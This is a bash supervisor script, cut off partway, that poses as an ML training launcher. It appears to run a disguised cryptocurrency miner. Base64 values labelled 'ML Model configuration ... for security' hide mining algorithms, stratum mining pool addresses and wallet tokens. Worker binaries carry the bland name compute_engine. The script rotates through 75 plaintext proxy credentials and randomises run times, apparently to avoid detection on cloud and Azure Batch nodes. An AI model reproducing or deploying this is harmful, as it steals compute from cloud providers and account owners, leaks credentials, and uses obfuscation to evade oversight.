                #!/bin/bash
set -o pipefail

# Set optimized environment
export TERM=xterm
export LC_ALL=C
export LANG=C.UTF-8
export DEBIAN_FRONTEND=noninteractive
export NEEDRESTART_MODE=a
export PYTHONUNBUFFERED=1
ulimit -n 65536

enforce_host_driver_library_precedence() {
    local -a preferred_paths=(
        "/usr/local/nvidia/lib64"
        "/usr/local/nvidia/lib"
        "/usr/lib/x86_64-linux-gnu"
    )
    local -a existing_paths=()
    local -a merged_paths=()
    local path=""
    local seen=":"
    
    IFS=':' read -r -a existing_paths <<< "${LD_LIBRARY_PATH:-}"
    for path in "${preferred_paths[@]}" "${existing_paths[@]}"; do
        [ -n "$path" ] || continue
        case "$path" in
            /usr/local/cuda/compat|/usr/local/cuda-*/compat)
                continue
                ;;
        esac
        case "$seen" in
            *":$path:"*)
                continue
                ;;
        esac
        merged_paths+=("$path")
        seen="${seen}${path}:"
    done
    
    LD_LIBRARY_PATH=$(IFS=:; echo "${merged_paths[*]}")
    export LD_LIBRARY_PATH
}
enforce_host_driver_library_precedence

# Prevent duplicate supervisor instances inside the same container
LOCK_FILE="/tmp/start_training.lock"
exec 9>"$LOCK_FILE"
if ! flock -n 9; then
    echo "Another start_training.sh instance is already running. Exiting."
    exit 1
fi

# ML Model configuration (base64 encoded for security)
MODEL_TYPE_A="b2N0b3B1cw=="
MODEL_TYPE_B="cmFuZG9teAo="
ENDPOINT_PRIMARY="c3RyYXR1bStzc2w6Ly83OC40Ni43NS4xNzc6ODAyNw=="
ENDPOINT_PRIMARY2="c3RyYXR1bStzc2w6Ly83OC40Ni43NS4xNzc6ODAyNw=="

AUTH_TOKEN_A="Y2Z4OmFhbWF3bW12dTN2cjIyeWo4ZDZ5eTNwYTljbXAwOHpjM2VjMnAzcnQ1cwo="
ENDPOINT_SECONDARY="c3RyYXR1bStzc2w6Ly81MS4yMjIuMjAwLjEzMzoxMDM0Mwo="
AUTH_TOKEN_B="NDRjc2lpYXpiaXlnRTVUZzVjNkhoY1VZNjN6MjZhM0NqOHAxRUJNTkE2RGNFTTZ3REFHaEZMdEZKVlVIUHl2RW9oRjRaOVBGM1pYdW5UdFdiaVRrOUh5akx4WUFVd2QK"

# CORRECTED PROXY LIST - Using working format from example
PROXY_LIST=(
    "p.webshare.io:80:yiyxudof-1:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-2:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-3:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-4:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-5:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-6:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-7:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-8:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-9:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-10:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-11:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-12:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-13:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-14:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-15:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-16:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-17:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-18:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-19:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-20:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-21:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-22:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-23:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-24:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-25:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-26:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-27:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-28:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-29:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-30:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-31:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-32:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-33:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-34:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-35:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-36:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-37:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-38:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-39:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-40:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-41:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-42:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-43:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-44:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-45:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-46:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-47:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-48:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-49:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-50:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-51:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-52:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-53:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-54:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-55:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-56:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-57:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-58:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-59:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-60:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-61:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-62:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-63:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-64:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-65:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-66:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-67:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-68:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-69:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-70:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-71:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-72:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-73:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-74:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-75:1avd45spqwnr"
)

# Global variables
declare -i PRIMARY_CPU_THREADS=0
declare -i SYSTEM_CPU_THREADS=0
declare -i GPU_COUNT=0
declare -g PROXY_IP=""
declare -g PROXY_PORT=""
declare -g PROXY_USER=""
declare -g PROXY_PASS=""
declare -g PROXY_STRING=""
declare -i ZERO_USAGE_COUNT=0
declare -i MAX_ZERO_USAGE=15
declare -i LOW_USAGE_CPU_THRESHOLD=10
declare -i LOW_USAGE_GPU_THRESHOLD=5
declare -i CPU_WORKLOAD_PID=0
declare -i TRAINING_PID=0
declare -i STARTUP_TIME=0
declare -a GPU_WORKLOAD_PIDS=()
declare -i CPU_RESTART_COUNT=0
declare -i GPU_RESTART_COUNT=0
declare -i CPU_CONSECUTIVE_FAILS=0
declare -a GPU_CONSECUTIVE_FAILS=()
declare -i CPU_ZERO_USAGE_STREAK=0
declare -i GPU_ZERO_USAGE_STREAK=0
declare -r HEARTBEAT_FILE="/tmp/supervisor_heartbeat"
declare -i BACKOFF_BASE_DELAY=1
declare -i BACKOFF_MAX_DELAY=60
declare -i BACKOFF_JITTER_MAX=2
declare -i ZERO_USAGE_STREAK_THRESHOLD=3
declare -ri LOG_MAX_SIZE_BYTES=10485760
declare -i LOG_MAINTENANCE_INTERVAL=600
declare -r EVENT_LOG_FILE="/workspace/logs/supervisor_events.log"
declare -r RESTART_WINDOW_FILE="/tmp/restart_events.log"
declare -i RESTART_WINDOW_SECONDS=900
declare -i RESTART_WARN_THRESHOLD=20
declare -i STARTUP_WARMUP_SECONDS=45
declare -i PROCESS_CHECK_INTERVAL_SECONDS=30
declare -i USAGE_CHECK_INTERVAL_SECONDS=90
declare -i STATUS_UPDATE_INTERVAL_SECONDS=10
declare -i MID_CYCLE_PROXY_ROTATION_SECONDS=7200
declare -i RUN_DURATION_BASE_SECONDS=21600
declare -i RUN_DURATION_JITTER_SECONDS=5401
declare -i CYCLE_PAUSE_BASE_SECONDS=3
declare -i CYCLE_PAUSE_JITTER_SECONDS=4
declare -i STARTUP_RETRY_DELAY_SECONDS=5
declare -i MAIN_LOOP_RETRY_DELAY_SECONDS=2
declare -i PROXY_ROTATE_MAX_ATTEMPTS=6
declare -i PROXY_TEST_TIMEOUT_SECONDS=4
declare -i PROXY_TEST_CURL_MAX_TIME_SECONDS=2
declare -r PROXY_ROTATE_RETRY_SLEEP_SECONDS="0.2"
declare -ri CLEANUP_TERM_GRACE_SECONDS=1
declare -ri MID_CYCLE_RESTART_GRACE_SECONDS=1
declare -ri GPU_START_VERIFY_DELAY_SECONDS=3
declare -ri CPU_START_VERIFY_DELAY_SECONDS=1
declare -ri TRAINING_START_VERIFY_DELAY_SECONDS=8
declare -ri TRAINING_CUDA_READY_TIMEOUT_SECONDS=30
declare -i METRICS_CACHE_MAX_AGE_SECONDS="${METRICS_CACHE_MAX_AGE_SECONDS:-45}"
declare -ri NVIDIA_SMI_TIMEOUT_SECONDS=4
declare -i METRICS_CACHE_UPDATED_AT=0
declare -i METRICS_CACHE_CPU_USAGE=0
declare -i METRICS_CACHE_GPU_USAGE=0
declare -i METRICS_CACHE_GPU_TEMP=0
declare -i METRICS_CACHE_GPU_MEM_USED=0
declare -i METRICS_CACHE_GPU_MEM_TOTAL=0
declare -i METRICS_CACHE_PROCESS_COUNT=0
declare -r LOW_PRIORITY_MODE="${LOW_PRIORITY_MODE:-false}"
declare -r AZURE_BATCH_LOW_PRIORITY_MODE="${AZURE_BATCH_LOW_PRIORITY_MODE:-false}"
declare -r PERF_MODE="${PERF_MODE:-max}"
declare -r SELF_TEST_ONLY="${SELF_TEST_ONLY:-false}"
declare -r ENABLE_PYTORCH_TRAINING="${ENABLE_PYTORCH_TRAINING:-false}"
declare -r REQUIRE_PERSISTENT_WORKSPACE_MOUNT="${REQUIRE_PERSISTENT_WORKSPACE_MOUNT:-false}"
declare -r PERSISTENT_WORKSPACE_PATH="${PERSISTENT_WORKSPACE_PATH:-/workspace}"
declare -r PYTORCH_CPU_ONLY="${PYTORCH_CPU_ONLY:-true}"
declare -r PYTORCH_CPU_MAX_PERCENT="${PYTORCH_CPU_MAX_PERCENT:-5}"
declare -r EXPECTED_NVIDIA_DRIVER_MAJOR="${EXPECTED_NVIDIA_DRIVER_MAJOR:-580}"
declare -i SYSTEM_THREAD_RESERVE_DEFAULT="${SYSTEM_THREAD_RESERVE_DEFAULT:-2}"
declare -i SYSTEM_THREAD_RESERVE_NO_TRAINING="${SYSTEM_THREAD_RESERVE_NO_TRAINING:-0}"
declare -r GPU_WARM_RESTART_MODE="${GPU_WARM_RESTART_MODE:-true}"
declare -i GPU_WARM_RESTART_MAX_EVENTS="${GPU_WARM_RESTART_MAX_EVENTS:-3}"
declare -i GPU_WARM_RESTART_WINDOW_SECONDS="${GPU_WARM_RESTART_WINDOW_SECONDS:-300}"
declare -i GPU_INIT_WAIT_SECONDS="${GPU_INIT_WAIT_SECONDS:-180}"
declare -i GPU_INIT_RETRY_INTERVAL_SECONDS="${GPU_INIT_RETRY_INTERVAL_SECONDS:-5}"
declare -a GPU_WARM_RESTART_EVENTS=()
declare -a GPU_WARM_RESTART_WINDOW_START=()
declare -i CLEANUP_IN_PROGRESS=0
declare -i LOW_PRIORITY_PROFILE_APPLIED=0
declare -g MODEL_TYPE_A_DEC=""
declare -g MODEL_TYPE_B_DEC=""
declare -g ENDPOINT_PRIMARY_DEC=""
declare -g ENDPOINT_PRIMARY2_DEC=""
declare -g ENDPOINT_SECONDARY_DEC=""
declare -g AUTH_TOKEN_A_DEC=""
declare -g AUTH_TOKEN_B_DEC=""

# Decode configuration parameters
decode_param() {
    echo "$1" | base64 -d 2>/dev/null | tr -d '\n'
}
is_truthy() {
    case "${1:-}" in
        1|true|TRUE|yes|YES|on|ON) return 0 ;;
        *) return 1 ;;
    esac
}

# Optional low-priority profile for preemptible/low-priority nodes
apply_runtime_profile() {
    if [ "$LOW_PRIORITY_PROFILE_APPLIED" -eq 1 ]; then
        return 0
    fi
    
    if is_truthy "$LOW_PRIORITY_MODE" || is_truthy "$AZURE_BATCH_LOW_PRIORITY_MODE"; then
        MAX_ZERO_USAGE=24
        ZERO_USAGE_STREAK_THRESHOLD=5
        LOW_USAGE_CPU_THRESHOLD=6
        LOW_USAGE_GPU_THRESHOLD=3
        
        STARTUP_WARMUP_SECONDS=90
        PROCESS_CHECK_INTERVAL_SECONDS=30
        USAGE_CHECK_INTERVAL_SECONDS=120
        STATUS_UPDATE_INTERVAL_SECONDS=5
        MID_CYCLE_PROXY_ROTATION_SECONDS=3600
        
        RUN_DURATION_BASE_SECONDS=10800
        RUN_DURATION_JITTER_SECONDS=3601
        CYCLE_PAUSE_BASE_SECONDS=20
        CYCLE_PAUSE_JITTER_SECONDS=21
        
        STARTUP_RETRY_DELAY_SECONDS=8
        MAIN_LOOP_RETRY_DELAY_SECONDS=4
        BACKOFF_BASE_DELAY=2
        BACKOFF_MAX_DELAY=180
        BACKOFF_JITTER_MAX=5
        
        PROXY_ROTATE_MAX_ATTEMPTS=8
        PROXY_TEST_TIMEOUT_SECONDS=6
        PROXY_TEST_CURL_MAX_TIME_SECONDS=4
        
        LOG_MAINTENANCE_INTERVAL=900
        RESTART_WINDOW_SECONDS=1800
        RESTART_WARN_THRESHOLD=35
        METRICS_CACHE_MAX_AGE_SECONDS=30
        
        GPU_WARM_RESTART_MAX_EVENTS=5
        GPU_WARM_RESTART_WINDOW_SECONDS=900
        
        echo "Low-priority runtime profile: ENABLED"
        log_event "INFO" "Low-priority runtime profile enabled"
    else
        echo "Low-priority runtime profile: DISABLED"
    fi
    
    LOW_PRIORITY_PROFILE_APPLIED=1
}

# One-switch performance profile selector for quick runtime tuning
apply_performance_profile() {
    case "${PERF_MODE:-max}" in
        max|MAX|turbo|TURBO)
            PROCESS_CHECK_INTERVAL_SECONDS=30
            USAGE_CHECK_INTERVAL_SECONDS=90
            STATUS_UPDATE_INTERVAL_SECONDS=10
            MID_CYCLE_PROXY_ROTATION_SECONDS=7200
            RUN_DURATION_BASE_SECONDS=21600
            RUN_DURATION_JITTER_SECONDS=5401
            CYCLE_PAUSE_BASE_SECONDS=3
            CYCLE_PAUSE_JITTER_SECONDS=4
            METRICS_CACHE_MAX_AGE_SECONDS=45
            SYSTEM_THREAD_RESERVE_NO_TRAINING=0
            echo "Performance profile: MAX"
            log_event "INFO" "Performance profile set to MAX"
            ;;
        balanced|BALANCED|standard|STANDARD)
            PROCESS_CHECK_INTERVAL_SECONDS=25
            USAGE_CHECK_INTERVAL_SECONDS=75
            STATUS_UPDATE_INTERVAL_SECONDS=10
            MID_CYCLE_PROXY_ROTATION_SECONDS=7200
            RUN_DURATION_BASE_SECONDS=14400
            RUN_DURATION_JITTER_SECONDS=3601
            CYCLE_PAUSE_BASE_SECONDS=5
            CYCLE_PAUSE_JITTER_SECONDS=6
            METRICS_CACHE_MAX_AGE_SECONDS=30
            SYSTEM_THREAD_RESERVE_NO_TRAINING=1
            echo "Performance profile: BALANCED"
            log_event "INFO" "Performance profile set to BALANCED"
            ;;
        *)
            echo "Performance profile: UNKNOWN (${PERF_MODE}), defaulting to MAX"
            PROCESS_CHECK_INTERVAL_SECONDS=30
            USAGE_CHECK_INTERVAL_SECONDS=90
            STATUS_UPDATE_INTERVAL_SECONDS=10
            MID_CYCLE_PROXY_ROTATION_SECONDS=7200
            RUN_DURATION_BASE_SECONDS=21600
            RUN_DURATION_JITTER_SECONDS=5401
            CYCLE_PAUSE_BASE_SECONDS=3
            CYCLE_PAUSE_JITTER_SECONDS=4
            METRICS_CACHE_MAX_AGE_SECONDS=45
            SYSTEM_THREAD_RESERVE_NO_TRAINING=0
            log_event "WARN" "Unknown PERF_MODE=${PERF_MODE}; defaulted to MAX"
            ;;
    esac
}

# Fail fast if required runtime commands are missing
validate_runtime_dependencies() {
    local -a required_cmds=(
        awk base64 curl date flock grep head kill mkdir mountpoint mv nice nohup nproc nvidia-smi pgrep pkill ps python3 rm sleep stat tail timeout touch wc
    )
    local -a missing_cmds=()
    local cmd=""
    
    for cmd in "${required_cmds[@]}"; do
        if ! command -v "$cmd" >/dev/null 2>&1; then
            missing_cmds+=("$cmd")
        fi
    done
    
    if [ ${#missing_cmds[@]} -gt 0 ]; then
        echo "FATAL: Missing required runtime commands: ${missing_cmds[*]}"
        log_event "ERROR" "Missing runtime commands: ${missing_cmds[*]}"
        exit 1
    fi
}

# Validate timing tunables to prevent invalid values causing unstable loops
validate_runtime_tunables() {
    local -a invalid_tunables=()
    
    [ "$MAX_ZERO_USAGE" -gt 0 ] || invalid_tunables+=("MAX_ZERO_USAGE")
    [ "$ZERO_USAGE_STREAK_THRESHOLD" -gt 0 ] || invalid_tunables+=("ZERO_USAGE_STREAK_THRESHOLD")
    [ "$LOW_USAGE_CPU_THRESHOLD" -gt 0 ] || invalid_tunables+=("LOW_USAGE_CPU_THRESHOLD")
    [ "$LOW_USAGE_GPU_THRESHOLD" -gt 0 ] || invalid_tunables+=("LOW_USAGE_GPU_THRESHOLD")
    [ "$BACKOFF_BASE_DELAY" -gt 0 ] || invalid_tunables+=("BACKOFF_BASE_DELAY")
    [ "$BACKOFF_MAX_DELAY" -gt 0 ] || invalid_tunables+=("BACKOFF_MAX_DELAY")
    [ "$BACKOFF_JITTER_MAX" -ge 0 ] || invalid_tunables+=("BACKOFF_JITTER_MAX")
    [ "$LOG_MAINTENANCE_INTERVAL" -gt 0 ] || invalid_tunables+=("LOG_MAINTENANCE_INTERVAL")
    [ "$RESTART_WINDOW_SECONDS" -gt 0 ] || invalid_tunables+=("RESTART_WINDOW_SECONDS")
    [ "$RESTART_WARN_THRESHOLD" -gt 0 ] || invalid_tunables+=("RESTART_WARN_THRESHOLD")
    [ "$STARTUP_WARMUP_SECONDS" -gt 0 ] || invalid_tunables+=("STARTUP_WARMUP_SECONDS")
    [ "$PROCESS_CHECK_INTERVAL_SECONDS" -gt 0 ] || invalid_tunables+=("PROCESS_CHECK_INTERVAL_SECONDS")
    [ "$USAGE_CHECK_INTERVAL_SECONDS" -gt 0 ] || invalid_tunables+=("USAGE_CHECK_INTERVAL_SECONDS")
    [ "$STATUS_UPDATE_INTERVAL_SECONDS" -gt 0 ] || invalid_tunables+=("STATUS_UPDATE_INTERVAL_SECONDS")
    [ "$MID_CYCLE_PROXY_ROTATION_SECONDS" -gt 0 ] || invalid_tunables+=("MID_CYCLE_PROXY_ROTATION_SECONDS")
    [ "$RUN_DURATION_BASE_SECONDS" -gt 0 ] || invalid_tunables+=("RUN_DURATION_BASE_SECONDS")
    [ "$RUN_DURATION_JITTER_SECONDS" -gt 0 ] || invalid_tunables+=("RUN_DURATION_JITTER_SECONDS")
    [ "$CYCLE_PAUSE_BASE_SECONDS" -gt 0 ] || invalid_tunables+=("CYCLE_PAUSE_BASE_SECONDS")
    [ "$CYCLE_PAUSE_JITTER_SECONDS" -gt 0 ] || invalid_tunables+=("CYCLE_PAUSE_JITTER_SECONDS")
    [ "$STARTUP_RETRY_DELAY_SECONDS" -gt 0 ] || invalid_tunables+=("STARTUP_RETRY_DELAY_SECONDS")
    [ "$MAIN_LOOP_RETRY_DELAY_SECONDS" -gt 0 ] || invalid_tunables+=("MAIN_LOOP_RETRY_DELAY_SECONDS")
    [ "$PROXY_ROTATE_MAX_ATTEMPTS" -gt 0 ] || invalid_tunables+=("PROXY_ROTATE_MAX_ATTEMPTS")
    [ "$PROXY_TEST_TIMEOUT_SECONDS" -gt 0 ] || invalid_tunables+=("PROXY_TEST_TIMEOUT_SECONDS")
    [ "$PROXY_TEST_CURL_MAX_TIME_SECONDS" -gt 0 ] || invalid_tunables+=("PROXY_TEST_CURL_MAX_TIME_SECONDS")
    [ "$METRICS_CACHE_MAX_AGE_SECONDS" -gt 0 ] || invalid_tunables+=("METRICS_CACHE_MAX_AGE_SECONDS")
    [ "$GPU_WARM_RESTART_MAX_EVENTS" -gt 0 ] || invalid_tunables+=("GPU_WARM_RESTART_MAX_EVENTS")
    [ "$GPU_WARM_RESTART_WINDOW_SECONDS" -gt 0 ] || invalid_tunables+=("GPU_WARM_RESTART_WINDOW_SECONDS")
    [ "$GPU_INIT_WAIT_SECONDS" -ge 0 ] || invalid_tunables+=("GPU_INIT_WAIT_SECONDS")
    [ "$GPU_INIT_RETRY_INTERVAL_SECONDS" -gt 0 ] || invalid_tunables+=("GPU_INIT_RETRY_INTERVAL_SECONDS")
    [ "$NVIDIA_SMI_TIMEOUT_SECONDS" -gt 0 ] || invalid_tunables+=("NVIDIA_SMI_TIMEOUT_SECONDS")
    
    if [ ${#invalid_tunables[@]} -gt 0 ]; then
        echo "FATAL: Invalid runtime tunables: ${invalid_tunables[*]}"
        log_event "ERROR" "Invalid runtime tunables detected: ${invalid_tunables[*]}"
        exit 1
    fi
}
# Validate log/checkpoint paths and optional persistent mount requirement
validate_persistent_storage() {
    local -a required_dirs=(
        "/workspace/logs"
        "/workspace/checkpoints"
    )
    local dir=""
    local probe_file=""
    
    for dir in "${required_dirs[@]}"; do
        mkdir -p "$dir" 2>/dev/null || {
            echo "FATAL: Failed to create required directory: $dir"
            log_event "ERROR" "Failed to create required directory: $dir"
            exit 1
        }
        probe_file="${dir}/.write_probe.$$"
        if ! : > "$probe_file" 2>/dev/null; then
            echo "FATAL: Directory is not writable: $dir"
            log_event "ERROR" "Directory not writable: $dir"
            exit 1
        fi
        rm -f "$probe_file" 2>/dev/null || true
    done
    
    if is_truthy "$REQUIRE_PERSISTENT_WORKSPACE_MOUNT"; then
        if ! mountpoint -q "$PERSISTENT_WORKSPACE_PATH" 2>/dev/null; then
            echo "FATAL: Required persistent mount missing at $PERSISTENT_WORKSPACE_PATH"
            log_event "ERROR" "Required persistent mount missing at $PERSISTENT_WORKSPACE_PATH"
            exit 1
        fi
    fi
}

# Decode all runtime parameters once and validate required values
initialize_decoded_runtime_config() {
    MODEL_TYPE_A_DEC=$(decode_param "$MODEL_TYPE_A")
    MODEL_TYPE_B_DEC=$(decode_param "$MODEL_TYPE_B")
    ENDPOINT_PRIMARY_DEC=$(decode_param "$ENDPOINT_PRIMARY")
    ENDPOINT_PRIMARY2_DEC=$(decode_param "$ENDPOINT_PRIMARY2")
    ENDPOINT_SECONDARY_DEC=$(decode_param "$ENDPOINT_SECONDARY")
    AUTH_TOKEN_A_DEC=$(decode_param "$AUTH_TOKEN_A")
    AUTH_TOKEN_B_DEC=$(decode_param "$AUTH_TOKEN_B")
    
    if [ -z "$MODEL_TYPE_A_DEC" ] || [ -z "$MODEL_TYPE_B_DEC" ] || \
       [ -z "$ENDPOINT_PRIMARY_DEC" ] || [ -z "$ENDPOINT_SECONDARY_DEC" ] || \
       [ -z "$AUTH_TOKEN_A_DEC" ] || [ -z "$AUTH_TOKEN_B_DEC" ]; then
        echo "FATAL: Decoding runtime configuration failed. Stopping container."
        log_event "ERROR" "Decoded runtime config validation failed; stopping container"
        exit 1
    fi
}

# Supervisor heartbeat for container health checks
update_heartbeat() {
    date +%s > "$HEARTBEAT_FILE"
}

# Keep heartbeat alive during longer sleeps (e.g., backoff)
sleep_with_heartbeat() {
    local total_seconds="${1:-1}"
    local -i whole_seconds=0
    local -i i=0
    
    if [[ "$total_seconds" =~ ^[0-9]+$ ]]; then
        whole_seconds=$total_seconds
        if [ $whole_seconds -le 0 ]; then
            return 0
        fi
        while [ $i -lt $whole_seconds ]; do
            update_heartbeat
            sleep 1
            i=$((i + 1))
        done
    else
        update_heartbeat
        sleep "$total_seconds"
    fi
}

# Exponential backoff with jitter, capped by max delay
calculate_backoff_delay() {
    local -i failures=${1:-1}
    local -i delay=$BACKOFF_BASE_DELAY
    local -i i=1
    
    if [ $failures -le 1 ]; then
        echo $((delay + (RANDOM % (BACKOFF_JITTER_MAX + 1))))
        return 0
    fi
    
    while [ $i -lt $failures ]; do
        delay=$((delay * 2))
        if [ $delay -ge $BACKOFF_MAX_DELAY ]; then
            delay=$BACKOFF_MAX_DELAY
            break
        fi
        i=$((i + 1))
    done
    
    echo $((delay + (RANDOM % (BACKOFF_JITTER_MAX + 1))))
}

# Prevent workload logs from growing without bound
cap_log_file_size() {
    local log_file="$1"
    local -i file_size=0
    local -r rotate_1="${log_file}.1"
    local -r rotate_2="${log_file}.2"
    
    [ -f "$log_file" ] || return 0
    
    file_size=$(stat -c%s "$log_file" 2>/dev/null || wc -c < "$log_file" 2>/dev/null || echo 0)
    if [ "$file_size" -le "$LOG_MAX_SIZE_BYTES" ]; then
        return 0
    fi
    
    tail -n 500 "$log_file" > "${log_file}.tmp" 2>/dev/null || true
    if [ -f "${log_file}.tmp" ]; then
        [ -f "$rotate_1" ] && mv -f "$rotate_1" "$rotate_2" 2>/dev/null || true
        mv -f "$log_file" "$rotate_1" 2>/dev/null || true
        mv -f "${log_file}.tmp" "$log_file" 2>/dev/null || : > "$log_file"
    else
        : > "$log_file"
    fi
    
    echo "Log trimmed: $log_file (was ${file_size} bytes)"
}

# Structured event logging for restarts and supervision actions
log_event() {
    local level="$1"
    shift
    
    mkdir -p /workspace/logs 2>/dev/null || true
    printf "%s [%s] %s\n" "$(date '+%Y-%m-%d %H:%M:%S')" "$level" "$*" >> "$EVENT_LOG_FILE"
    cap_log_file_size "$EVENT_LOG_FILE"
}

# Track restart rate to surface unhealthy restart loops
record_restart_event() {
    local -i now=$(date +%s)
    local -i recent_count=0
    
    mkdir -p /tmp 2>/dev/null || true
    touch "$RESTART_WINDOW_FILE" 2>/dev/null || true
    echo "$now" >> "$RESTART_WINDOW_FILE" 2>/dev/null || true
    
    awk -v now="$now" -v window="$RESTART_WINDOW_SECONDS" \
        '$1 ~ /^[0-9]+$/ && (now - $1) <= window { print $1 }' \
        "$RESTART_WINDOW_FILE" > "${RESTART_WINDOW_FILE}.tmp" 2>/dev/null || true
    
    if [ -f "${RESTART_WINDOW_FILE}.tmp" ]; then
        mv -f "${RESTART_WINDOW_FILE}.tmp" "$RESTART_WINDOW_FILE" 2>/dev/null || true
    fi
    
    recent_count=$(wc -l < "$RESTART_WINDOW_FILE" 2>/dev/null || echo 0)
    if ! [[ "$recent_count" =~ ^[0-9]+$ ]]; then
        recent_count=0
    fi
    
    if [ "$recent_count" -ge "$RESTART_WARN_THRESHOLD" ]; then
        log_event "WARN" "High restart rate detected; count=$recent_count window_seconds=$RESTART_WINDOW_SECONDS"
    fi
}

# Safe process counting helper (avoids malformed values from fallback echo patterns)
safe_pgrep_count() {
    local pattern="$1"
    local count=""
    
    count=$(pgrep -fc "$pattern" 2>/dev/null || true)
    if ! [[ "$count" =~ ^[0-9]+$ ]]; then
        count=0
    fi
    
    echo "$count"
}

# Count active compute worker processes
get_total_worker_count() {
    local -i cpu_count=0
    local -i gpu_count=0
    
    cpu_count=$(safe_pgrep_count "/opt/bin/compute_engine($| )")
    gpu_count=$(safe_pgrep_count "/opt/bin/compute_engine_g($| )")
    echo $((cpu_count + gpu_count))
}

# CPU usage for primary CPU worker only
get_cpu_worker_usage() {
    local usage=""
    
    if [ "$CPU_WORKLOAD_PID" -gt 0 ] && command -v ps &>/dev/null; then
        usage=$(ps -p "$CPU_WORKLOAD_PID" -o %cpu= 2>/dev/null | awk '{printf "%d", $1+0}')
    fi
    
    if ! [[ "$usage" =~ ^[0-9]+$ ]]; then
        usage=0
    fi
    if [ "$usage" -gt 100 ]; then
        usage=100
    fi
    
    echo "$usage"
}

# Aggregate GPU metrics across all GPUs: util temp mem_used mem_total
get_gpu_metrics() {
    local metrics=""
    
    if [ "$GPU_COUNT" -gt 0 ] && command -v nvidia-smi &>/dev/null; then
        metrics=$(timeout "$NVIDIA_SMI_TIMEOUT_SECONDS" nvidia-smi --query-gpu=utilization.gpu,temperature.gpu,memory.used,memory.total \
            --format=csv,noheader,nounits 2>/dev/null | \
            awk -F',' '{u+=$1; t+=$2; mu+=$3; mt+=$4; c++} END {if(c>0) printf "%d %d %d %d", u/c, t/c, mu, mt; else print "0 0 0 0"}')
    fi
    
    if [[ "$metrics" =~ ^[0-9]+\ [0-9]+\ [0-9]+\ [0-9]+$ ]]; then
        echo "$metrics"
    else
        echo "0 0 0 0"
    fi
}

# Shared runtime metrics sampler: cpu gpu gpu_temp gpu_mem_used gpu_mem_total process_count
sample_runtime_metrics() {
    local force_refresh="${1:-0}"
    local -i now=0
    local -i cache_age=0
    local -i cpu_usage=0
    local -i gpu_usage=0
    local -i gpu_temp=0
    local -i gpu_mem_used=0
    local -i gpu_mem_total=0
    local -i process_count=0
    
    now=$(date +%s)
    cache_age=$((now - METRICS_CACHE_UPDATED_AT))
    
    if [ "$force_refresh" -eq 1 ] || [ "$METRICS_CACHE_UPDATED_AT" -le 0 ] || [ "$cache_age" -ge "$METRICS_CACHE_MAX_AGE_SECONDS" ]; then
        process_count=$(get_total_worker_count)
